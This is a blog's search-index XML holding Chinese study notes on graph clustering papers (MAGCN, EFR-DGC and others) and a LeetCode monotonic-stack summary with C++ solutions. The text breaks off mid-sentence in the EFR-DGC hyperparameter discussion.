<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>Contrastive Multi-View Representation Learning on Graphs</title>
      <link href="/2023/04/02/MVGRL/"/>
      <url>/2023/04/02/MVGRL/</url>
      
        <content type="html"><![CDATA[<h1 id="论文阅读05-Contrastive-Multi-View-Representation-Learning-on-Graphs：MVRLG"><a href="#论文阅读05-Contrastive-Multi-View-Representation-Learning-on-Graphs：MVRLG" class="headerlink" title="论文阅读05-Contrastive Multi-View Representation Learning on Graphs：MVRLG"></a>论文阅读05-Contrastive Multi-View Representation Learning on Graphs：MVRLG</h1><h2 id="论文信息"><a href="#论文信息" class="headerlink" title="论文信息"></a>论文信息</h2><p>论文地址：<a href="https://arxiv.org/abs/2006.05582"> Contrastive Multi-View Representation Learning on Graphs (arxiv.org)</a></p><p>论文代码：<a href="https://github.com/kavehhassani/mvgrl">kavehhassani/mvgrl (github.com)</a></p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://www.jianshu.com/p/607a6a0e4c31">MVGRL：多视图图对比学习 - 简书 (jianshu.com)</a></p><p><a href="https://www.cnblogs.com/BlairGrowing/p/16060887.html">论文解读（MVGRL）Contrastive Multi-View Representation Learning on Graphs - 加微信X466550探讨 - 博客园 (cnblogs.com)</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> 论文 </tag>
            
            <tag> 深度聚类 </tag>
            
            <tag> 图深度学习 </tag>
            
            <tag> 多视图 </tag>
            
            <tag> 对比 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Multi-View Attribute Graph Convolution Networks for Clustering</title>
      <link href="/2023/03/26/MAGCN/"/>
      <url>/2023/03/26/MAGCN/</url>
      
        <content type="html"><![CDATA[<h1 id="论文阅读04-Multi-View-Attribute-Graph-Convolution-Networks-for-Clustering：MAGCN"><a href="#论文阅读04-Multi-View-Attribute-Graph-Convolution-Networks-for-Clustering：MAGCN" class="headerlink" title="论文阅读04-Multi-View Attribute Graph Convolution Networks for Clustering：MAGCN"></a>论文阅读04-Multi-View Attribute Graph Convolution Networks for Clustering：MAGCN</h1><h2 id="论文信息"><a href="#论文信息" class="headerlink" title="论文信息"></a>论文信息</h2><p>论文地址：<a href="https://www.ijcai.org/proceedings/2020/411">Multi-View Attribute Graph Convolution Networks for Clustering | IJCAI</a></p><p>论文代码：<a href="https://github.com/IMKBLE/MAGCN">MAGCN </a></p><h2 id="1-多视图属性聚类：MAGCN"><a href="#1-多视图属性聚类：MAGCN" class="headerlink" title="1.多视图属性聚类：MAGCN"></a><strong>1.多视图属性聚类：MAGCN</strong></h2><h3 id="1-存在问题：GNN-融入Multi-View-Graph"><a href="#1-存在问题：GNN-融入Multi-View-Graph" class="headerlink" title="1.存在问题：GNN 融入Multi-View Graph"></a>1.存在问题：GNN 融入Multi-View Graph</h3><p>1）他们<strong>不能将指定学习的不同权重的分配给邻域内的不同节点；</strong></p><p> 2）他们可能<strong>忽略了进行节点属性和图结构的重构</strong>以提高鲁棒性； </p><p>3）对于<strong>不同视图之间的一致性关系</strong>，<strong>没有明确考虑相似距离度量</strong>。</p><h3 id="2-解决问题：MAGCN"><a href="#2-解决问题：MAGCN" class="headerlink" title="2.解决问题：MAGCN"></a>2.解决问题：MAGCN</h3><p>本论文提出了一种新的<strong>多视图属性图卷积网络</strong>，用于<strong>聚类（MAGCN）多视图属性的图结构数据</strong></p><ol><li><p>为了将可<code>学习的权重分配给不同的节点</code>，MAGCN开发了<code>具有注意机制的多视图属性图卷积编码器</code>，用于<code>从多视图图数据中学习图嵌入</code>。</p></li><li><p><code>属性和图重建均由 MAGCN 的图卷积解码器</code>计算。</p></li><li><p>将<code>多视图图数据之间</code>的<code>几何关系和概率分布一致性</code>纳入M<code>AGCN的一致嵌入编码器中</code>，以进一步促进聚类任务。</p></li></ol><p><code>编码器1：</code></p><p><strong>开发多视图属性图注意力网络</strong>以<strong>减少噪声/冗余并学习多视图图数据的图嵌入特征。</strong></p><p><code>编码器2：</code></p><p><strong>开发一致的嵌入编码器来</strong>捕获<strong>不同视图之间的几何关系和概率分布的一致性，</strong>从而<strong>自适应地为多视图属性找到一致的聚类嵌入空间</strong>。</p><h2 id="2-MAGCN模型创新点"><a href="#2-MAGCN模型创新点" class="headerlink" title="2.MAGCN模型创新点"></a>2.MAGCN模型创新点</h2><ol><li>我们提出了一种<strong>新的多视图属性图卷积网络</strong>，用于对<strong>多视图属性的图结构数据进行聚类</strong>。</li><li>我们开发了<strong>具有注意机制的多视图属性图卷积编码器</strong>，以<strong>减少多视图图数据的噪声/冗余</strong>。</li><li>此外，还考虑了<strong>节点属性和图结构的重构以提高鲁棒性</strong>。<strong>一致性嵌入编码器旨在通过探索不同视图的几何关系和概率分布一致性来提取多个视图之间的一致性信息</strong>。</li></ol><h2 id="3-MAGCN-模型"><a href="#3-MAGCN-模型" class="headerlink" title="3.MAGCN 模型"></a>3.MAGCN 模型</h2><h3 id="1-MAGCN-先验知识"><a href="#1-MAGCN-先验知识" class="headerlink" title="1.MAGCN 先验知识"></a>1.MAGCN 先验知识</h3><blockquote><ol><li>MAGCN的编码器</li></ol></blockquote><p><img src="https://raw.githubusercontent.com/GhyJn0/2023images/master/202303271434749.png" alt="image-20230327143439693"></p><p>这个X 特征重构中GAT来自于：[<a href="https://arxiv.org/abs/1905.10715">1905.10715] Graph Attention Auto-Encoders (arxiv.org)</a></p><blockquote><ol start="2"><li>GAT 和GATE 的区别</li></ol></blockquote><p>GATE:<a href="https://arxiv.org/abs/1905.10715">1905.10715] Graph Attention Auto-Encoders (arxiv.org)</a></p><p>GAT: <a href="https://arxiv.org/abs/1710.10903">1710.10903] Graph Attention Networks (arxiv.org)</a></p><p><img src="C:\Users\life\AppData\Roaming\Typora\typora-user-images\image-20230327201208314.png" alt="image-20230327201208314"></p><p><img src="C:\Users\life\AppData\Roaming\Typora\typora-user-images\image-20230327200539965.png" alt="image-20230327200539965"></p><p><img src="C:\Users\life\AppData\Roaming\Typora\typora-user-images\image-20230327200624428.png" alt="image-20230327200624428"></p><blockquote><ol start="2"><li>图中参数</li></ol></blockquote><p><img src="https://raw.githubusercontent.com/GhyJn0/2023images/master/202303271437321.png" alt="image-20230327143739274"></p><h3 id="2-模型架构图"><a href="#2-模型架构图" class="headerlink" title="2.模型架构图"></a>2.模型架构图</h3><p><img src="https://raw.githubusercontent.com/GhyJn0/2023images/master/202303271445814.png" alt="image-20230327144517730"></p><p><code>MAGCN模型主要有两个编码器</code>组成：<strong>多视图属性图卷积编码器</strong>和<strong>一致嵌入编码器</strong></p><p>用于聚类的多视图属性图卷积网络 (MAGCN) 的框架。</p><ol><li>具有注意机制的多视图属性图卷积编码器：它们用于<code>从节点属性和图数据（图结构）中学习图嵌入</code>。<code>执行属性和图形重建以进行端到端学习</code>。 </li></ol><ol start="2"><li>一致嵌入编码器(Consistent embedding encoders)：通过<code>几何关系和概率分布的一致性</code>，<code>进一步在多个视图之间获得一致的聚类嵌入</code>。</li></ol><p><strong>MAGCN 模型训练过程：</strong></p><p>我们首先将多视图图数据 Xm，通过多视图属性图卷积编码器 编码为图嵌入。将 Hm 馈入一致的嵌入编码器并获得一致的聚类嵌入 Z。<code>聚类过程最终在由 Z 计算出的理想嵌入内在描述空间上进行</code>。</p><h3 id="3-MAGCN-模块详细"><a href="#3-MAGCN-模块详细" class="headerlink" title="3. MAGCN 模块详细"></a>3. MAGCN 模块详细</h3><h4 id="1-多视图属性图卷积编码器：Multi-view-Attribute-Graph-Convolution-Encoder"><a href="#1-多视图属性图卷积编码器：Multi-view-Attribute-Graph-Convolution-Encoder" class="headerlink" title="1. 多视图属性图卷积编码器：Multi-view Attribute Graph Convolution Encoder"></a>1. 多视图属性图卷积编码器：Multi-view Attribute Graph Convolution Encoder</h4><p>主要作用：在多视图属性图卷积编码器中，第一个编码器将多视图节点属性矩阵和图结构映射到图嵌入空间。</p><h4 id="2-一致嵌入编码器：Consistent-embedding-encoders"><a href="#2-一致嵌入编码器：Consistent-embedding-encoders" class="headerlink" title="2.一致嵌入编码器：Consistent embedding encoders"></a>2.一致嵌入编码器：Consistent embedding encoders</h4>]]></content>
      
      
      
        <tags>
            
            <tag> 论文 </tag>
            
            <tag> 深度聚类 </tag>
            
            <tag> 图深度学习 </tag>
            
            <tag> 多视图 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>R-GAE</title>
      <link href="/2023/03/23/R-GAE/"/>
      <url>/2023/03/23/R-GAE/</url>
      
        <content type="html"><![CDATA[<h2 id="论文信息"><a href="#论文信息" class="headerlink" title="论文信息"></a>论文信息</h2><p>论文地址：[<a href="https://arxiv.org/abs/2107.08562">2107.08562] Rethinking Graph Auto-Encoder Models for Attributed Graph Clustering (arxiv.org)</a></p><p>论文代码：<a href="https://github.com/nairouz/R-GAE">nairouz/R-GAE (github.com)</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>商品折扣后的最终价格</title>
      <link href="/2023/03/21/1475.%E5%95%86%E5%93%81%E6%8A%98%E6%89%A3%E5%90%8E%E7%9A%84%E6%9C%80%E7%BB%88%E4%BB%B7%E6%A0%BC/"/>
      <url>/2023/03/21/1475.%E5%95%86%E5%93%81%E6%8A%98%E6%89%A3%E5%90%8E%E7%9A%84%E6%9C%80%E7%BB%88%E4%BB%B7%E6%A0%BC/</url>
      
        <content type="html"><![CDATA[<h1 id="1475-商品折扣后的最终价格"><a href="#1475-商品折扣后的最终价格" class="headerlink" title="1475. 商品折扣后的最终价格"></a><a href="https://leetcode.cn/problems/final-prices-with-a-special-discount-in-a-shop/">1475. 商品折扣后的最终价格</a></h1><h2 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h2>]]></content>
      
      
      
        <tags>
            
            <tag> leetcode </tag>
            
            <tag> 单调栈 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>分类合集、</title>
      <link href="/2023/03/21/leetcode%E5%88%86%E7%B1%BB%E5%90%88%E9%9B%86/"/>
      <url>/2023/03/21/leetcode%E5%88%86%E7%B1%BB%E5%90%88%E9%9B%86/</url>
      
        <content type="html"><![CDATA[<h1 id="leetcode-分类合集"><a href="#leetcode-分类合集" class="headerlink" title="leetcode  分类合集"></a>leetcode  分类合集</h1><h2 id="单调栈"><a href="#单调栈" class="headerlink" title="单调栈"></a>单调栈</h2><h3 id="1-解决问题"><a href="#1-解决问题" class="headerlink" title="1. 解决问题"></a>1. 解决问题</h3><p>单调栈解决的问题：</p><p>求下一个更大的元素、求下一个更小的元素、求左右两边第一个更大/更小的元素。</p><p>求<strong>右边</strong>第一个较大的数字：<strong>逆序</strong>遍历，<strong>单调递减栈</strong> —— 如果<strong>当前元素大于等于栈顶元素</strong>，则栈顶出栈。<br>求<strong>右边</strong>第一个较小的数字：<strong>逆序</strong>遍历，<strong>单调递增栈</strong> —— 如果<strong>当前元素小于等于栈顶元素</strong>，则栈顶出栈。<br>求<strong>左边</strong>第一个较大的数字：<strong>正序</strong>遍历，<strong>单调递减栈</strong> —— 如果<strong>当前元素大于等于栈顶元素</strong>，则栈顶出栈。<br>求<strong>左边</strong>第一个较小的数字：<strong>正序</strong>遍历，<strong>单调递增栈</strong> —— 如果<strong>当前元素小于等于栈顶元素</strong>，则栈顶出栈</p><p><code>总结： </code></p><p><code>右边 较大，较小都是逆序遍历</code><strong>：正序遍历也可以  。</strong></p><p><code> 左边 较大  较小 都是正序遍历</code></p><p>参考链接：<a href="https://blog.csdn.net/chuangshangbeidong/article/details/122638512">https://blog.csdn.net/chuangshangbeidong/article/details/122638512</a></p><h4 id="1475-商品折扣后的最终价格"><a href="#1475-商品折扣后的最终价格" class="headerlink" title="1475. 商品折扣后的最终价格"></a><a href="https://leetcode.cn/problems/final-prices-with-a-special-discount-in-a-shop/">1475. 商品折扣后的最终价格</a></h4><p><a href="https://leetcode.cn/problems/next-greater-element-i/">496. 下一个更大元素 I - 力扣（LeetCode）</a></p><p><a href="https://leetcode.cn/problems/daily-temperatures/">739. 每日温度 - 力扣（LeetCode）</a>：用下标</p><p><a href="https://leetcode.cn/problems/next-greater-element-ii/">503. 下一个更大元素 II - 力扣（LeetCode）</a> 逆序，正序都可以</p><h3 id="1-模板总结：寻找当前元素-下一个更大的元素"><a href="#1-模板总结：寻找当前元素-下一个更大的元素" class="headerlink" title="1.模板总结：寻找当前元素 下一个更大的元素"></a>1.模板总结：寻找当前元素 下一个更大的元素</h3><h4 id="1-逆序-栈中存值"><a href="#1-逆序-栈中存值" class="headerlink" title="1.  逆序 栈中存值"></a>1.  逆序 栈中存值</h4><pre class=" language-c++"><code class="language-c++">class Solution &#123;public:    vector<int> dailyTemperatures(vector<int>& nums) &#123;             // 寻找下一个更大的数：        // 1.栈存储 数组的值        // 2.栈采用递减        int n=nums.size();// 数组的长度        stack<int> st;// 初始化一个栈        vector<int> res(n,0);// 初始化一个和nums 同样大小的数组，存储结果        for(int i=n-1;i>=0;i--)&#123;            while(!st.empty() && st.top()<nums[i] )// 栈顶小于当前的值 ，pop                st.pop();            int result;//            if (st.empty())//当前栈为空，说明后面不存在比他大的值复制为0                result=0;            else                result=st.top();//dandan            st.push(nums[i]);// 把当前元素压入栈            res[i]=result;// 把找到的结果压入到 res数组中                   &#125;        return res;    &#125;&#125;;</code></pre><p><strong><code>上面的代码还可优化：</code></strong></p><p><strong><code>不需要开辟新的数组res;由于 nums[i]从后往前确定，同时st栈中存储了nums[i]的值，所以可以直接把result的值直接赋值给nums[i]</code></strong></p><pre class=" language-c++"><code class="language-c++">class Solution &#123;public:    vector<int> dailyTemperatures(vector<int>& nums) &#123;             // 寻找下一个更大的数：        // 1.栈存储 数组的值        // 2.栈采用递减        int n=nums.size();// 数组的长度        stack<int> st;// 初始化一个栈        for(int i=n-1;i>=0;i--)&#123;            while(!st.empty() && st.top()<nums[i] )// 栈顶小于当前的值 ，pop                st.pop();            int result;//            if (st.empty())//当前栈为空，说明后面不存在比他大的值复制为0                result=0;            else                result=st.top();//dandan            st.push(nums[i]);// 因为这个时候已经存储一份nums[i]的值            nums[i]=result;// 所以此时就算修改nums[i] 也没有影响        &#125;        return nums;    &#125;&#125;;</code></pre><h4 id="2-逆序-栈中存下标"><a href="#2-逆序-栈中存下标" class="headerlink" title="2. 逆序 栈中存下标"></a>2. 逆序 栈中存下标</h4><pre class=" language-c++"><code class="language-c++">class Solution &#123;public:    vector<int> dailyTemperatures(vector<int>& nums) &#123;        //         // 寻找下一个更大的数：        // 1.栈存储 数组的下标        // 2.栈采用递减        int n=nums.size();// 数组的长度        stack<int> st;// 初始化一个栈,存储的是nums 的下标        vector<int> res(n,0);// 初始化一个和nums 同样大小的数组，存储结果        for(int i=n-1;i>=0;i--)&#123;            while(!st.empty() && nums[st.top()]<nums[i] )// 栈顶小于当前的值 pop                st.pop();            if (st.empty())//当前栈为空，说明后面不存在比他大的值复制为0                res[i]=0;            else                res[i]=nums[st.top()];//  此时st 栈中存储的是下标，故将值压入到 res数组中            st.push(i);// 把当前元素的下标压入栈                    &#125;        return res;     &#125;&#125;;</code></pre><p><code>重点：此时要用res 数组存储最后的结果，为啥不能省略，用nums[i]=代替，因为此时st 栈存出的是下标，不能再是 nums中的值，此时如果用nums[i] 代替的时候，修改了nums中的原始值，接下来在res[i]=nums[st.top()]时，nums[st.top()]值时修改了的nums的值</code></p><h4 id="3-正序遍历-存下标"><a href="#3-正序遍历-存下标" class="headerlink" title="3. 正序遍历 存下标"></a>3. 正序遍历 存下标</h4><pre class=" language-c++"><code class="language-c++">class Solution &#123;public:    vector<int> dailyTemperatures(vector<int>& nums) &#123;        //         // 寻找下一个更大的数：        // 1.栈存储 数组的值        // 2.栈采用递减        int n=nums.size();// 数组的长度        stack<int> st;// 初始化一个栈,存储的是nums 的下标        vector<int> res(n,0);// 初始化一个和nums 同样大小的数组，存储结果        for(int i=0;i<n;i++)&#123;            while(!st.empty() && nums[st.top()]<nums[i] )&#123;//从前往后遍历，当nums[i]>栈顶表示 ，找到了故                res[st.top()]=nums[i];//此时栈中存储的时下标，故栈顶的下标即是所要求的下标 复制nums[i]                st.pop();            &#125;            st.push(i);// 把当前元素的下标压入栈        &#125;        return res;     &#125;&#125;;</code></pre><p><code>重点 ：此时正序遍历存值，是写不出来。</code></p><h2 id="二叉树"><a href="#二叉树" class="headerlink" title="二叉树"></a>二叉树</h2><h3 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h3><p><a href="https://leetcode.cn/problems/same-tree/">100. 相同的树</a></p><p><a href="https://leetcode.cn/problems/subtree-of-another-tree/">572. 另一棵树的子树</a></p><p><a href="https://leetcode.cn/problems/maximum-depth-of-binary-tree/">104. 二叉树的最大深度</a></p><p><a href="https://leetcode.cn/problems/diameter-of-binary-tree/">543. 二叉树的直径</a></p><p><a href="https://leetcode.cn/problems/er-cha-shu-de-zui-jin-gong-gong-zu-xian-lcof/">剑指 Offer 68 - II. 二叉树的最近公共祖先</a></p><p><a href="https://leetcode.cn/problems/er-cha-sou-suo-shu-de-zui-jin-gong-gong-zu-xian-lcof/">剑指 Offer 68 - I. 二叉搜索树的最近公共祖先</a>：<a href="https://leetcode.cn/problems/er-cha-shu-de-zui-jin-gong-gong-zu-xian-lcof/solution/jian-dan-yi-dong-xiang-jie-ru-xia-by-yuanninesuns/">简单易懂，详解如下 - 二叉树的最近公共祖先 - 力扣（LeetCode）</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> leetcode </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Deep graph clustering with enhanced feature representations for community detection</title>
      <link href="/2023/03/20/EFR-DGC/"/>
      <url>/2023/03/20/EFR-DGC/</url>
      
        <content type="html"><![CDATA[<h1 id="论文阅读03-EFR-DGC-Enhanced-Feature-Representations-for-Deep-Graph-Clustering"><a href="#论文阅读03-EFR-DGC-Enhanced-Feature-Representations-for-Deep-Graph-Clustering" class="headerlink" title="论文阅读03-EFR-DGC:Enhanced Feature Representations for Deep Graph Clustering"></a>论文阅读03-EFR-DGC:Enhanced Feature Representations for Deep Graph Clustering</h1><h2 id="论文信息"><a href="#论文信息" class="headerlink" title="论文信息"></a>论文信息</h2><p>论文地址：<a href="https://link.springer.com/article/10.1007/s10489-022-03381-y">Deep graph clustering with enhanced feature representations for community detection | SpringerLink</a></p><p>论文代码：<a href="https://github.com/grcai/DGC-EFR">https://github.com/grcai/DGC-EFR</a></p><h2 id="1-存在问题"><a href="#1-存在问题" class="headerlink" title="1.存在问题"></a>1.存在问题</h2><ol><li><strong>DAEGC在处理拓扑关系 方面取得了成功，</strong>但<strong>深度图聚类通常无法充分学习节点的属性信息</strong>。 节点特征信息学习不足。======<strong>图模型通常更关注拓扑信息而忽略节点属性的重要性</strong>。</li></ol><p>​    <code>DAEGC 这篇论文</code>中证明了：<strong>图注意力网络构建图自动编码器</strong>，作为<strong>更强大的学习者来提取足够的拓扑信息进行聚类</strong>：<code>EFR-DGC  拓扑关系（结构信息）： 通过利用DAEGC 中的图注意力机制的编码器，来处理拓扑关系和属性信息融合</code>。</p><ol start="2"><li><strong>结构深度聚类网络（SDCN）</strong>和<strong>深度融合聚类网络（DFCN）</strong>将节点的结构信息整合到深度聚类中,<strong>图模型的能力有限</strong>以及缺乏足够的模型优化自监督信息，这<strong>两者仍然存在特征表示不足的问题</strong>：</li></ol><p>​    <code>SDCN这篇论文</code>中证明了：<strong>自动编码器</strong>，作为**<code>来学习层次的属性关系</code>**。<code>EFR-DGC  属性关系（节点特征信息）： 通过利用SDCN 中的AE编码器，来学习层次的属性关系。</code></p><h2 id="2-EFR-DGC解决问题"><a href="#2-EFR-DGC解决问题" class="headerlink" title="2.EFR-DGC解决问题"></a>2.EFR-DGC解决问题</h2><p>提出一种改进的特征表示方法，用于发现社区中的深度图聚类。</p><ol><li>首先构造一个具有<code>多个全连接层的基本自动编码器 (AE)</code>来<code>学习层次属性信息</code>，</li><li>然后将<code>AE学习到的属性信息，其传递给图自动编码器（GAE）</code>的神经层。<code>图自编码器接收到的分层属性信息与其提取的拓扑关系有机地组合</code>，以<code>生成用于聚类的增强的特征表示</code>。</li><li>其次，<code>设计了一自监督机制来优化深度图聚类模型</code>，该机制利用<code>两个自动编码器的重构损失</code>和<code>聚类损失作为自监督信息，有效地指导模型更新</code>。这样克服了生成表示中<code>属性信息不足的问题，从而更有利于社区发现</code>。</li></ol><p><strong>优点长处：</strong></p><p>与 <strong>SDCN 和 DFCN 中使用的简单图卷积网络相比</strong>，我们的<strong>图自动编码器能够通过为相邻节点分配不同的权重来很好地处理它们的属性和拓扑信息</strong></p><h2 id="3-模型"><a href="#3-模型" class="headerlink" title="3.模型"></a>3.模型</h2><h3 id="1-模型架构图"><a href="#1-模型架构图" class="headerlink" title="1. 模型架构图"></a>1. 模型架构图</h3><p><img src="https://raw.githubusercontent.com/GhyJn0/2023images/master/202303201621519.png" alt="image-20230320162121435"></p><p><strong>EFR-DGC模型架构 主要由3个模块组成</strong>： <strong><code>学习节点属性信息的基本编码器AE 来自SCDN论文</code></strong>, 学**<code>习图的结构信息即拓扑结构信息，并融合属性信息的带有注意力机制的图编码器 来自DAEGC 论文</code>，**以及<code>带有自监督的聚类模块</code>**。</p><h3 id="2-模型的模块详细介绍"><a href="#2-模型的模块详细介绍" class="headerlink" title="2.模型的模块详细介绍"></a>2.模型的模块详细介绍</h3><h4 id="1-AE编码器-学习属性信息"><a href="#1-AE编码器-学习属性信息" class="headerlink" title="1. AE编码器 学习属性信息"></a>1. AE编码器 学习属性信息</h4><p>我们使用<code>具有多个全连接层的基本自动编码器 (AE)</code> 从<code>原始特征数据X</code>中学习<code>分层属性信息</code>，并将其<code>学习到的信息嵌入到潜在空间中的紧凑特征表示中</code>和SCDN中论文一模一样。</p><p><img src="https://raw.githubusercontent.com/GhyJn0/2023images/master/202303201700080.png" alt="AE"></p><h4 id="2-带有注意力机制的GAE"><a href="#2-带有注意力机制的GAE" class="headerlink" title="2.带有注意力机制的GAE"></a>2.带有注意力机制的GAE</h4><p>我们通过图注意力网络 (GAT) 构建图自动编码器 (GAE)，并将其与基本 AE 相结合以生成增强的特征表示。</p><blockquote><ol><li>编码器encoding</li></ol></blockquote><p>　<code>EFR-DGC 认为图具有复杂的结构关系，建议在</code>编码器中利用高阶邻居<code>。我们通过</code>考虑图中的 t 阶邻居节点获得邻近矩阵M： t参数可以根据实验结果，自己调节，也即是输入参数`</p><p><img src="https://raw.githubusercontent.com/GhyJn0/2023images/master/202303211653841.png" alt="image-20230321165331742"></p><p><strong>接下来计算顶点之间的图注意力系数: 顶点间的图注意力是不对成的 即 aij 不等于aji</strong></p><p><img src="https://raw.githubusercontent.com/GhyJn0/2023images/master/202303211654466.png" alt="image-20230321165406389"></p><p><strong>图注意层得到图注意力自动编码器的编码器部分层级更新:</strong></p><p><img src="https://raw.githubusercontent.com/GhyJn0/2023images/master/202303211654350.png" alt="image-20230321165433300"></p><p><img src="https://raw.githubusercontent.com/GhyJn0/2023images/master/202303211655796.png" alt="image-20230321165523738"></p><blockquote><ol start="2"><li>解码器decoding</li></ol></blockquote><p><img src="https://raw.githubusercontent.com/GhyJn0/2023images/master/202303211657198.png" alt="image-20230321165701147"></p><blockquote><ol start="3"><li>损失函数计算</li></ol></blockquote><p> 采用交叉熵损失函数：</p><p><img src="https://raw.githubusercontent.com/GhyJn0/2023images/master/202303211657883.png" alt="image-20230321165737844"></p><h4 id="3-自监督机制"><a href="#3-自监督机制" class="headerlink" title="3. 自监督机制"></a>3. 自监督机制</h4><p><strong>我们使用学生 t 分布 作为函数来计算节点 i 的特征表示 zi 与聚类中心 uj 之间的相似度：聚类中心 u 是用基于 Z 的 K-means 初始化的。</strong></p><p><img src="https://raw.githubusercontent.com/GhyJn0/2023images/master/202303211706043.png" alt="image-20230321170602984"></p><p><strong><em>qiu\</em>表示节点i属于簇u的概率，将其看作是每个节点的软聚类分配标签，如果值越大，那么可信度越高</strong> 。通过平方运算将这种可信度放大，</p><p><img src="https://raw.githubusercontent.com/GhyJn0/2023images/master/202303211706635.png" alt="image-20230321170636596"></p><p>自训练聚类模块的损失函数采用KL 散度：</p><p><img src="https://raw.githubusercontent.com/GhyJn0/2023images/master/202303211707924.png" alt="image-20230321170708897"></p><p><strong>聚类损失然后迫使当前分布 Q 逼近目标分布 P ，从而将这些“置信分配”设置为软标签来监督 Q 的嵌入学习</strong></p><p><img src="https://raw.githubusercontent.com/GhyJn0/2023images/master/202303211707129.png" alt="image-20230321170731078"></p><h4 id="4-总损失函数"><a href="#4-总损失函数" class="headerlink" title="4. 总损失函数"></a>4. 总损失函数</h4><p>🔤KL散度被视为聚类损失。整体学习目标由两部分组成，即基本AE和GAE的重构损失，以及聚类损失：🔤</p><p><img src="https://raw.githubusercontent.com/GhyJn0/2023images/master/202303211708229.png" alt="image-20230321170812167"></p><h4 id="5-算法流程图"><a href="#5-算法流程图" class="headerlink" title="5. 算法流程图"></a>5. 算法流程图</h4><p><img src="https://raw.githubusercontent.com/GhyJn0/2023images/master/202303211736726.png" alt="image-20230321173645666"></p><h3 id="3-实验结果分析"><a href="#3-实验结果分析" class="headerlink" title="3. 实验结果分析"></a>3. 实验结果分析</h3><blockquote><ol><li>比较方法分析</li></ol></blockquote><p><strong>K-means[48]是<code>经典聚类算法</code>的代表。</strong></p><p> <strong>AE、DEC 和 IDEC 代表了<code>深度学习方</code>法，它们通过神经网络学习聚类任务的<code>潜在数据表示</code>。</strong></p><p> <strong>GAE/VGAE、SDCN 和我们的基线方法 DAEGC  是通过<code>图神经网络学习潜在数据表示</code>的<code>深度图聚类方法</code>。</strong></p><blockquote><ol start="2"><li>模型好的原因</li></ol></blockquote><p><img src="https://raw.githubusercontent.com/GhyJn0/2023images/master/202303232013524.png" alt="image-20230323201311472"></p><p>原因是我们的<code>EFRDGC考虑了数据属性信息</code>，为节点分区提供了重要依据。同时，<code>自监督机制在指导模型优化方面</code>也发挥着重要作用。结果，<code>EFR-DGC生成消除了节点特征表示中的属性不足</code>，以<code>提高同一社区内的节点凝聚力</code>并减<code>少不同社区之间的重叠。</code></p><p><strong>即 SDCN 模型中 AE 模块能有效提取 节点的属性信息。解决节点的属性不足能力。</strong></p><p><strong>即DAEGC 模型中带有GAT 的GAE ，能有效提取图的结构的信息。并有效融合节点的属性信息。</strong></p><blockquote><ol start="3"><li>DBLP 和cora数据集实验分析</li></ol></blockquote><p><img src="https://raw.githubusercontent.com/GhyJn0/2023images/master/202303232009113.png" alt="image-20230323200901921"></p><p>原因一：</p><p><strong>DBLP 和 Cora 比 ACM 和 Citeseer 中的更密集</strong>。即 <code>DBLP 和 Cora 的相邻矩阵更密集</code>。<code>节点之间更密集的连接通常意味着更复杂的关系。</code> <code>EFR-DGC 模型</code>中的<code>图注意力网络具有更多在处理此类数据方面的优势</code>，因为<code>它可以学习不同邻域的权重更精确地表示居中节点的节点</code></p><p>原因二：</p><p>一方面，我们<code>构建了一个图自动编码器</code>，而<code>不是一个简单的图卷积网络</code>，作为<code>一个更强大的学习器来提取完整的拓扑信息即结构信息</code>。同时，<code>图自动编码器能够通过为相邻节点分配不同的权重来很好地处理相邻节点之间的关系</code>。另一方面，我们模型中的<code>两个自动编码器提供了更强的自监督信息</code>，可以有效地指导模型优化。因此，我<code>们的方法在处理具有复杂关系的社区数据时显示出巨大的优势即 处理节点密集的图</code></p><h3 id="4-消融实验分析"><a href="#4-消融实验分析" class="headerlink" title="4. 消融实验分析"></a>4. 消融实验分析</h3><h4 id="1-EFR-DGC-的有效性"><a href="#1-EFR-DGC-的有效性" class="headerlink" title="1. EFR-DGC 的有效性"></a>1. EFR-DGC 的有效性</h4><p><img src="https://raw.githubusercontent.com/GhyJn0/2023images/master/202303232022469.png" alt="image-20230323202222409"></p><p>我们分别使用 <code>AE、GAE 和 EFR-DGC 生成特征表示</code>。然后，<code>特征表示用于在四个数据集中进行聚类任务</code></p><p><strong>实验分析：</strong></p><p><code>单一的AE模型不擅长处理图数据</code>，因为<code>它没有考虑节点之间的关系： 即结构信息 没有考虑</code>。</p><p><strong>与GAE（DAEGC中使用的模型）相比</strong>，<code>EFR-DGC中的模块层包含更充分和可区分的属性信息</code></p><p><code>结果表明来自基本 AE 的分层属性信息可以帮助 GAE 丰富数据表达。 多维和多粒度信息，从而提高特征表达能力</code></p><h4 id="2-超参数"><a href="#2-超参数" class="headerlink" title="2. 超参数"></a>2. 超参数</h4><blockquote><ol><li>超参数是 中的 λ平衡了两个部分（AE 和 GAE）对隐藏表示的影响</li></ol></blockquote><p><img src="https://raw.githubusercontent.com/GhyJn0/2023images/master/202303232104394.png" alt="image-20230323210459335"></p><p>有两个重要的超参数决定了我们模型的性能。第一个超参数是 (12) 中的 λ，<code>它平衡了两个部分（AE 和 GAE）对隐藏表示的影响。</code>换句话说，<code>λ 决定了 GAE 层中的新隐藏表示从 AE 模块接收了多少属性信息</code>。我们<code>对 λ 进行了网格搜索，正如我们所见，当 λ 设置为 0.1 时，我们的模型在所有数据集上都达到了最高的精度</code></p><p><img src="https://raw.githubusercontent.com/GhyJn0/2023images/master/202303232101841.png" alt="image-20230323210100768"></p><p><img src="https://raw.githubusercontent.com/GhyJn0/2023images/master/202303232103776.png" alt="image-20230323210349720"></p><blockquote><ol start="2"><li>超参数 ε 控制聚类损失</li></ol></blockquote><p><img src="https://raw.githubusercontent.com/GhyJn0/2023images/master/202303232104296.png" alt="image-20230323210404236"></p><p>损失函数 (22) 中的第<code>二个超参数 ε 控制聚类损失的影响。</code>我们<code>进行实验以显示超参数对所有数据集的影响</code>。</p><p>图 5 <code>说明了我们的模型在参数集  &#123;0.01, 0.1, 1.0, 10, 100&#125; 